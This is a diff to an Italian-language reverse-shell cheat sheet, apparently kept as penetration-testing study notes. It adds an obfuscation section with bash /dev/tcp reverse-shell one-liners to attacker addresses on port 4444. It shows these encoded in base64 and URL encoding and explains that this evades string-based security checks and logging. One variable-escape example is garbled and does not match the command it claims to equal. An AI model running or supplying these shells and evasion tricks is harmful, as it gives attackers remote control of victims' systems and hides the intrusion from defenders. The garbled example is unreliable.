@@ -5,6 +5,7 @@ Il materiale ha solo scopo di studio non si intende diffondere codice dnnoso. Ut
 * [When](#when)
 * [Tools](#tools)
 * [Reverse Shell](#reverse-shell)
+    * [Obfuscation](#obfuscation)
     * [Awk](#awk)
     * [Automatic Reverse Shell Generator](#revshells)
     * [Bash TCP](#bash-tcp)
@@ -177,6 +178,81 @@ Questo comando crea una **reverse shell compatta**:
 - Avvia una nuova shell **Bash** in modalità **login shell**.  
 - In questa modalità vengono letti i file di configurazione come `~/.bash_profile` o `~/.profile`.  
 - È utile quando serve un ambiente più completo rispetto a una shell non-login.
+```
+
+# Obfuscation
+
+# Base64 di one-liner Bash
+
+## Comando
+```bash
+echo -ne 'bash -i  >& /dev/tcp/10.10.14.17/4444    0>&1' | base64
+```
+
+## Passo per passo
+
+### `echo -ne '...'`
+- `echo` stampa la stringa fornita.  
+- `-n` evita l’andata a capo finale.  
+- `-e` interpreta sequenze speciali (ad es. `\n`, `\t`), qui non presenti ma utile per alcune shellcode.
+
+## Definizione
+**Obfuscation** significa “oscuramento” o “offuscamento”.  
+In informatica indica tecniche che **nascondono l’intento reale di un comando o di un codice**, rendendolo meno leggibile per esseri umani o per sistemi di sicurezza automatizzati.
+
+---
+
+## Perché si usa
+1. **Bypassare controlli superficiali**  
+   Alcuni sistemi cercano stringhe specifiche (es. `/bin/bash`, `nc`, `sh`).  
+   Con l’offuscamento, queste stringhe non sono visibili in chiaro.
+
+2. **Evitare logging diretto**  
+   Nei log rimane solo una sequenza codificata, non il comando originale.
+
+3. **Ridurre la leggibilità per un umano**  
+   A colpo d’occhio non si capisce l’azione reale, serve decodifica.
+
+---
+
+## Esempi comuni
+
+### Base64
+```bash
+echo "ls -la" | base64
+# Output: bHMgLWxhCg==
+
+echo "bHMgLWxhCg==" | base64 -d
+# Output: ls -la
+```
+
+### URL encoding
+```
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+diventa:
+```
+bash%20-i%20%3E%26%20/dev/tcp/10.10.10.10/4444%200%3E%261
+```
+
+### Escape e variabili
+```bash
+$e$X -c "c$M d.ir"
+```
+equivale a:
+```bash
+echo -c "cmd dir"
+```
+
+---
+
+## Diagramma ASCII
+
+```
+[Comando in chiaro] ---> [Obfuscation] ---> [Stringa codificata]
+        ^                                      |
+        |                                      v
+   [Analista / IDS]  <--- [Decodifica] --- [Stringa in chiaro]
 ```
 
 ### Bash UDP
